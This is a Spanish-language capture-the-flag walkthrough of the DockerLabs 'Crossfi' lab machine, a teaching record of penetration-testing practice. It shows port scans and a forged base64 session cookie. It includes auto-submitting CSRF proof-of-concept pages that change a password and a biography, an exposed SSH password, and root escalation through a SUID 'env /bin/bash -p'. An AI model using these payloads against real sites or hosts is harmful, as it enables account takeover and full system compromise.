---
icon: flag
---

# Crossfi DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip crossfi.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh crossfi.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 07:50 PST
Nmap scan report for 172.17.0.2
Host is up (0.00010s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.13.5)
| http-title: Laboratorio CSRF
|_Requested resource was /login
|_http-server-header: Werkzeug/3.1.3 Python/3.13.5
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
```

Veremos varias cosas interesantes, entre ellas el puerto `5000` que aloja una pagina web, vamos a entrar dentro a ver que vemos.

```
URL = http://<IP>:5000/
```

Veremos un `login`, pero tambien nos podremos crear una cuenta, por lo que vamos a darle al `registrarse` y crearemos una cuenta, hecho esto iniciaremos sesion con dichas credenciales viendo lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-28 100421.png" alt=""><figcaption></figcaption></figure>

Veremos una especie de `dashboard` en el que nos mostrar informacion sobre nuestra cuenta, etc...

Investigando un poco si le damos al boton con nombre `Panel` veremos que podremos cambiar la contraseña, esto de por si ya es interesante, por lo que vamos abrir `BurpSuite` y analizaremos la peticion a ver que vemos.

## Nivel 1

### Forma 1

Si nos ponemos con nuestro `proxy` en mitad de la comunicacion y le damos a `Actualizar contraseña` veremos lo siguiente:

```
POST /change-password HTTP/1.1
Host: 172.17.0.2:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://172.17.0.2:5000
Connection: keep-alive
Referer: http://172.17.0.2:5000/dashboard
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImRpc2VvIn0.aSnFQw.YjxwBD52RSTml9xa0xB0If2LGZI
Upgrade-Insecure-Requests: 1
Priority: u=0, i


new_password=diseo
```

Vemos que nos esta proporcionando una `Cookie` de sesion, si nosotros decodificamos toda la cadena antes del primer `.` veremos esta informacion:

```shell
echo 'eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImRpc2VvIn0' | base64 -d
```

Info:

```
{"user_id":1,"username":"diseo"}
```

Vamos a probar a cambiar el `username` por el nombre de `admin` y lo volvemos a codificar.

```shell
echo '{"user_id":1,"username":"admin"}' | base64
```

Info:

```
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0K
```

Ahora en nuestra peticion tiene que aparecer algo asi con estas modificaciones:

```
POST /change-password HTTP/1.1
Host: 172.17.0.2:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://172.17.0.2:5000
Connection: keep-alive
Referer: http://172.17.0.2:5000/dashboard
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0K.aSnFQw.YjxwBD52RSTml9xa0xB0If2LGZI
Upgrade-Insecure-Requests: 1
Priority: u=0, i


new_password=diseo
```

Ahora vamos a dejar que siga su flujo normal la peticion y veremos en la pagina lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-28 102220.png" alt=""><figcaption></figcaption></figure>

### Forma 2

Pero tambien podremos hacerlo de esta otra forma mas sencilla, crearemos una pagina maliciosa en la que aprovecharemos esta vulnerabilidad.

> pwned.html

```html
<html>
  <body>
    <form action="http://172.17.0.2:5000/change-password" method="POST">
      <input type="hidden" name="new_password" value="hacked123" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Ahora si abrimos esta pagina de esta forma:

```shell
open pwned.html
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-28 102347.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado tambien, por lo que vamos al siguiente nivel.

## Escalate user balulero

### Nivel 2

Si inspeccionamos el codigo veremos que hay un campo que no esta protegido por `token CSRF` que es el siguiente bloque:

```html
<form method="POST" action="/update-biografia" class="field-form">
    <textarea class="form-control profile-input mb-2" name="biografia" rows="4"
        placeholder="Háblanos un poco sobre ti..."
        required></textarea>
    <button type="submit" class="btn btn-outline-success w-100">Actualizar Biografía</button>
</form>
```

Se corresponde a la descripcion de la biografia, podremos aprovechar esto para explotar la vulnerabilidad de esta forma:

Vamos a crear de nuevo una pagina `PoC` para esta vulnerabilidad:

> pwned2.html

```html
<!DOCTYPE html>
<html>
<head>
    <title>Actualización de Perfil</title>
</head>
<body>
    <h2>Actualizando tu perfil...</h2>
    <form action="http://172.17.0.2:5000/update-biografia" method="POST">
        <input type="hidden" name="biografia" value="HACKED VIA CSRF - Acceso SSH comprometido" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

Ahora si la abrimos veremos lo siguiente:

```shell
open pwned2.html
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-28 102934.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado por lo que nos podremos conectar por `SSH` metiendo las credenciales que muestra.

### SSH

```shell
ssh balulero@<IP>
```

Metemos como contraseña `balulei`...

```
Linux 01eb097ba3c3 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
balulero@01eb097ba3c3:~$ whoami
balulero
```

Veremos que accedimos de forma correcta.

## Escalate Privileges

Si realizamos un `find` de los permisos `SUID` que tenemos a nivel de sistema, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
3545115     56 -rwsr-xr-x   1 root     root        55688 May  9  2025 /usr/bin/umount
  3545027     20 -rwsr-xr-x   1 root     root        18816 May  9  2025 /usr/bin/newgrp
  3544904     52 -rwsr-xr-x   1 root     root        52936 Apr 19  2025 /usr/bin/chsh
  3544898     72 -rwsr-xr-x   1 root     root        70888 Apr 19  2025 /usr/bin/chfn
  3545091     84 -rwsr-xr-x   1 root     root        84360 May  9  2025 /usr/bin/su
  3544965     88 -rwsr-xr-x   1 root     root        88568 Apr 19  2025 /usr/bin/gpasswd
  3545038    116 -rwsr-xr-x   1 root     root       118168 Apr 19  2025 /usr/bin/passwd
  3545022     72 -rwsr-xr-x   1 root     root        72072 May  9  2025 /usr/bin/mount
  3821675     56 -rwsr-xr-x   1 root     root        56144 Jun  4 15:14 /usr/bin/env
  3568488    300 -rwsr-xr-x   1 root     root       306456 Jun 30 05:55 /usr/bin/sudo
  3572547     52 -rwsr-xr--   1 root     messagebus    51272 Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  3573381    484 -rwsr-xr-x   1 root     root         494144 Aug  1 15:02 /usr/lib/openssh/ssh-keysign
```

De toda esta informacion la que mas nos interesa es la siguiente linea:

```
3821675     56 -rwsr-xr-x   1 root     root      56144 Jun  4 15:14 /usr/bin/env
```

Vemos que tiene permisos `SUID` el binario `env` por lo que podremos escalar a `root` de esta forma:

```shell
env /bin/bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto veremos que ya seremos `root` por lo que habremos terminado la maquina.
